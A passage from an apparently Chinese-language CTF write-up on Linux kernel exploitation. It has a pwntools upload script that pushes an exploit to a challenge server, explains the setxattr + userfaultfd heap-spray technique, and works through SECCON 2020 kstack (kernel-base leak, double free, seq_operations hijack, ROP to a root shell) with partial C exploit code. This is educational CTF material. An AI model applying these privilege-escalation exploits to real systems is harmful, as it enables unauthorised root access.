class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./exp&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    exp = base64.b64encode(f.read())<br><br>p = remote(<span class="hljs-string">&quot;82.157.40.132&quot;</span>, <span class="hljs-number">54100</span>)<br>try_count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p.sendline()<br>    p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br><br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exp), <span class="hljs-number">0x200</span>):<br>        p.sendline(<span class="hljs-string">&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="hljs-number">0x200</span>].decode() + <span class="hljs-string">&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)<br>        count += <span class="hljs-number">1</span><br>        log.info(<span class="hljs-string">&quot;count: &quot;</span> + <span class="hljs-built_in">str</span>(count))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>        p.recvuntil(<span class="hljs-string">&quot;/ $&quot;</span>)<br><br>    p.sendline(<span class="hljs-string">&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;chmod +x /tmp/exploit&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;/tmp/exploit &quot;</span>)<br>    <span class="hljs-keyword">break</span><br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><p>传远程，运行，成功提权</p><p><a href="https://i.loli.net/2021/11/20/4Mtasj1QRYUAhcI.png"><img src="https://s2.loli.net/2023/02/06/tBgqLoSiPT5Hj3d.png" alt="image.png"></a></p><h2 id="setxattr-userfaultfd-堆占位技术（may-obsolete）"><a href="#setxattr-userfaultfd-堆占位技术（may-obsolete）" class="headerlink" title="setxattr + userfaultfd 堆占位技术（may obsolete）"></a>setxattr + userfaultfd 堆占位技术（may obsolete）</h2><p>setxattr 是一个十分独特的系统调用族，抛开其本身的功能，在 kernel 的利用当中他可以为我们提供<strong>近乎任意大小的内核空间 object 分配</strong></p><p>观察 setxattr 源码，发现如下调用链：</p><figure class="highlight isbl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ISBL"><span class="hljs-function"><span class="hljs-title">SYS_setxattr</span>()</span><br>    <span class="hljs-function"><span class="hljs-title">path_setxattr</span>()</span><br>        <span class="hljs-function"><span class="hljs-title">setxattr</span>()</span><br></code></pre></div></td></tr></table></figure><p>在 <code>setxattr()</code> 函数中有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span></span><br><span class="hljs-function"><span class="hljs-title">setxattr</span><span class="hljs-params">(struct dentry *d, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> __user *name, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> __user *value,</span></span><br><span class="hljs-params"><span class="hljs-function">     <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">int</span> flags)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//...</span><br>        kvalue = kvmalloc(size, GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!kvalue)<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        <span class="hljs-keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;<br><br>    <span class="hljs-comment">//,..</span><br><br>    kvfree(kvalue);<br><br>    <span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这里的 value 和 size 都是由我们来指定的，即<strong>我们可以分配任意大小的 object 并向其中写入内容</strong> </p><p>但是该 object 在 setxattr 执行结束时又会被放回 freelist 中，设想若是我们需要劫持该 object 的前 8 字节，那将前功尽弃</p><p>重新考虑 setxattr 的执行流程，其中会调用 <code>copy_from_user</code> 从用户空间拷贝数据，那么让我们考虑如下场景：</p><p>我们通过 mmap 分配连续的两个页面，在第二个页面上启用 userfaultfd，并在第一个页面的末尾写入我们想要的数据，此时我们调用 setxattr 进行<strong>跨页面的拷贝</strong>，当 copy_from_user 拷贝到第二个页面时<strong>便会触发 userfaultfd，从而让 setxattr 的执行流程卡在此处，这样这个 object 就不会被释放掉，而是可以继续参与我们接下来的利用</strong> </p><p><a href="https://i.loli.net/2021/11/28/vBgSsTLRf5ZdYaJ.png"><img src="https://s2.loli.net/2023/02/06/9M1YfIZRdFLxCHo.png" alt="image.png"></a></p><p>这便是 setxattr + userfaultfd 结合的堆占位技术</p><h3 id="例题：SECCON-2020-kstack"><a href="#例题：SECCON-2020-kstack" class="headerlink" title="例题：SECCON 2020 kstack"></a>例题：SECCON 2020 kstack</h3><h4 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h4><p>惯例地查看启动脚本：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs BASH"><span class="hljs-meta">#!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 512M \<br>    -kernel ./bzImage \<br>    -initrd ./rootfs.cpio \<br>    -append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr quiet&quot;</span> \<br>    -cpu kvm64,+smep \<br>    -net user -net nic -device e1000 \<br>    -monitor /dev/null \<br>    -nographic<br></code></pre></div></td></tr></table></figure><p>开启了 smep 和 kaslr</p><p>查看 <code>/sys/devices/system/cpu/vulnerabilities/*</code>：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL">/ $ cat /sys/devices/system/cpu/vulnerabilities/*<br>Processor vulnerable<br>Mitigation: PTE Inversion<br>Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown<br>Mitigation: PTI<br>Vulnerable<br>Mitigation: usercopy/swapgs barriers and __user pointer sanitization<br>Mitigation: Full generic retpoline, STIBP: disabled, RSB filling<br>Not affected<br></code></pre></div></td></tr></table></figure><p>开启了 KPTI</p><p>拖入 IDA 中进行分析，发现只定义了一个 ioctl 的两种功能</p><h5 id="创建链表节点"><a href="#创建链表节点" class="headerlink" title="创建链表节点"></a>创建链表节点</h5><p>先分析第一种功能，在这里先用 kmalloc 分配了一个 object，之后将其使用头插法通过全局变量 head 插入到单向链表中</p><p><a href="https://i.loli.net/2021/11/24/mxPugZ1TQCE3aNd.png"><img src="https://s2.loli.net/2023/02/06/UtOXVYQpx2lCRPD.png" alt="image.png"></a></p><p>分析可知其结构应当如下所示：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">void</span>            *unknown;<br>    <span class="hljs-keyword">char</span>             data[<span class="hljs-number">8</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>     *<span class="hljs-title">next</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>该结构体前八个字节是从 <code>current_task</code> 的某个特殊偏移取的值，经尝试可知为线程组 id，我们来看其分配过程，使用了 <code>kmem_cache_alloc(kmalloc_caches[5], 0x60000C0)</code>，第二个参数是 flag ，为常规的 <code>GFP_KERNEL</code>，这里可以暂且忽略</p><p>现在我们来看第一个参数，笔者推测这应当是 gcc 优化 kmalloc 的结果；在内核中有一个数组 <code>kmalloc_caches</code> 存放 kmem_cache，在内核源码 <code>mm/slab_common.c</code> 中我们可以得知其初始化的大小</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * kmalloc_info[] is to make slub_debug=,kmalloc-xx option work at boot time.</span><br><span class="hljs-comment"> * kmalloc_index() supports up to 2^25=32MB, so the final entry of the table is</span><br><span class="hljs-comment"> * kmalloc-32M.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmalloc_info_struct</span> <span class="hljs-title">kmalloc_info</span>[] __<span class="hljs-title">initconst</span> =</span> &#123;<br>    INIT_KMALLOC_INFO(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">96</span>, <span class="hljs-number">96</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">192</span>, <span class="hljs-number">192</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">8</span>, <span class="hljs-number">8</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">16</span>, <span class="hljs-number">16</span>),<br>    INIT_KMALLOC_INFO(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>),<br><span class="hljs-comment">//...</span><br></code></pre></div></td></tr></table></figure><p>下标 <code>[5]</code> 即第六个 kmem_cache 为 <code>kmalloc-32</code>，由此我们可以得知分配的 object 大小为 0x20</p><h5 id="删除链表节点"><a href="#删除链表节点" class="headerlink" title="删除链表节点"></a>删除链表节点</h5><p>比较简单且常规的脱链操作，会将同一线程组创建的节点中的头节点删除，并将其 data 拷贝给用户</p><p><a href="https://i.loli.net/2021/11/24/jAEpYPWQSvDbq5M.png"><img src="https://s2.loli.net/2023/02/06/76iSTyZDgbCQL2z.png" alt="image.png"></a></p><p>若并节点所属线程组与当前进程非同一线程组，则会一直找到那个线程组的节点或是遍历结束为止</p><p><a href="https://i.loli.net/2021/11/25/s2SDNnlTWPobk6d.png"><img src="https://s2.loli.net/2023/02/06/JM26dSnHN1Wh9vy.png" alt="image.png"></a></p><p>分析下来，联想到题目名叫 <code>k stack</code>，我们不难猜出这是在模拟栈的 push 与 pop 操作</p><h4 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h4><p>我们注意到其拷贝时使用了 copy_from_user 与 copy_to_user，且 <strong>ioctl 操作全程没有加锁</strong>，这为 userfaultfd 提供了可能性</p><h5 id="1）泄露内核基址：shm-file-data"><a href="#1）泄露内核基址：shm-file-data" class="headerlink" title="1）泄露内核基址：shm_file_data"></a>1）泄露内核基址：shm_file_data</h5><p>在创建节点时先将新的 object 赋给 head 指针，之后再调用 copy_from_user，我们不难想到的是，可以通过 userfaultfd 让分配线程在 copy_from_user 这里卡住，之后我们在 userfaultfd 线程当中再将该 object 释放，这样我们就能够读出 8 字节的“脏数据”，那么在如此之前我们应当分配一个带有可用数据的结构体并释放</p><p>由于题目限制了分配的 object 的大小，故我们应当考虑从 kmallc-32 中分配的结构体，这里笔者选用 <code>shm_file_data</code> 这一结构体，其定义如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shm_file_data</span> &#123;</span><br>    <span class="hljs-keyword">int</span> id;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_operations_struct</span> *<span class="hljs-title">vm_ops</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>其中我们可以读取的 <code>ns</code> 域刚好指向内核 .text 段，由此我们可以泄露出内核基址</p><p>我们可以在通过 <code>shmget</code> 系统调用创建共享内存之后通过 <code>shmat</code> 系统调用获得该结构体，通过 <code>shmdt</code> 我们可以释放该结构体</p><blockquote><p>在这里有个笔者弄不明白原因的点：我们需要先创建 userfaultfd 线程后再进行 shm 操作，<strong>否则会失败</strong>，在笔者理解中这操作两个之间的顺序并不关键</p></blockquote><h5 id="2）构造-double-free"><a href="#2）构造-double-free" class="headerlink" title="2）构造 double free"></a>2）构造 double free</h5><p>构造 double free 的流程比较简单，我们只需要在 pop 时通过 copy_to_user 触发 userfaultfd，在 userfaultfd 线程中再 pop 一次即可</p><h5 id="3）userfaultfd-setxattr-劫持-seq-operations-控制内核执行流"><a href="#3）userfaultfd-setxattr-劫持-seq-operations-控制内核执行流" class="headerlink" title="3）userfaultfd + setxattr 劫持 seq_operations 控制内核执行流"></a>3）userfaultfd + setxattr 劫持 seq_operations 控制内核执行流</h5><p>现在在 kmalloc-32 当中的第一个 object 指向自身，那么在接下来的两次分配中我们都将会获得同一个 object，第一次分配时笔者选择分配到 seq_operations 处，接下来我们通过 setxattr 再一次分配到该 object，通过 setxattr 更改 seq_operations 中的指针</p><p>由于我们需要劫持其第一个指针，故这里我们不能够让 setxattr 执行到末尾将 object 又释放掉，而应当在 setxattr 中的 copy_from_user 中用 userfaultfd 卡住，在 userfaultfd 线程中触发劫持后指针控制内核执行流</p><p>控制内核执行流后笔者选择用常规的 pt_regs 来完成 ROP</p><h5 id="4-修复-kmalloc-32-的-freelist-拿到稳定-root-shell"><a href="#4-修复-kmalloc-32-的-freelist-拿到稳定-root-shell" class="headerlink" title="4) 修复 kmalloc-32 的 freelist 拿到稳定 root shell"></a>4) 修复 kmalloc-32 的 freelist 拿到稳定 root shell</h5><p>在我们通过 double free 完成利用之后，<strong>内核空间的 kmalloc-32 的 freelist已经被破坏了</strong>，此时我们若是直接起一个 shell 则会造成 kernel panic，因此我们在返回用户空间之后需要先修复 freelist</p><p>修复 freelist 只需要往里面放入一定数量的 object 即可，笔者选择在一开始时先多次打开 <code>/proc/self/stat</code> 分配大量 seq_operations 结构体做备用，之后在 setxattr 线程中将其全部释放，这样我们就能够完美着陆回用户态，安全地起一个稳定的 root shell</p><h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>最终的 exp 如下：</p><blockquote><p>kernelpwn.h 见本文开头</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/shm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-keyword">int</span>             dev_fd;<br><span class="hljs-keyword">size_t</span>          seq_fd;<br><span class="hljs-keyword">size_t</span>          seq_fd_reserve[<span class="hljs-number">0x100</span>];<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span>     *page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">size_t</span>   page_size;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">leak_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] push trapped in userfaultfd.&quot;</span>);<br>        pop(&amp;kernel_offset);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak ptr: %p\n&quot;</span>, kernel_offset);<br>        kernel_offset -= <span class="hljs-number">0xffffffff81c37bc0</span>;<br>        kernel_base += kernel_offset;<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">double_free_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span 